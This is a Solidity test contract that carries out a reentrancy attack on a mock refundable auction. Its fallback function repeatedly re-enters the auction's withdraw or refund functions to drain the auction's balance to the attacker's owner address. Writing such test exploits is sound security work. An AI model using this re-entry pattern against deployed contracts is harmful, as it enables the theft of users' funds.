pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./mocks/RefundableAuctionImpl.sol";

contract AttackContract {
    RefundableAuctionImpl public auction;
    uint256 public targetFunction; 
    address payable public owner;
    bool public isTest;

    constructor(address payable _auctionAddress, bool _test, uint256 _targetFunction) {
        require(_test, "AttackContract is for test only");
        auction = RefundableAuctionImpl(_auctionAddress);
        targetFunction = _targetFunction;
        isTest = _test;
        owner = payable(msg.sender);
    }

    // Start the re-entry attack
function attack(uint256 _attackValue) external payable {
    require(isTest, "AttackContract is only for test");
    require(msg.value == _attackValue, "Attack value must match the sent value");

    if (targetFunction == 0) {
        auction.placeBids{value: _attackValue}();
    } else if (targetFunction == 1) {
        auction.placeBids{value: _attackValue}();
        // Assuming withdrawFunds() is a function that requires some previous condition
        // like placing a bid, being an owner, etc.
        auction.withdrawFunds();
    } else if (targetFunction == 2) {
        auction.placeBids{value: _attackValue}();
        auction.claimRefund();
    }
}

    // Fallback
    fallback() external payable {
        if (targetFunction == 0 && address(auction).balance >= 1 ether) {
            auction.withdrawToken();
        } else if (targetFunction == 1 && address(auction).balance >= 1 ether) {
            auction.withdrawFunds();
        } else if (targetFunction == 2 && address(auction).balance >= 1 ether) {
            auction.claimRefund();
        } else {
            owner.transfer(address(this).balance);
        }
    }

    receive() external payable {}
}
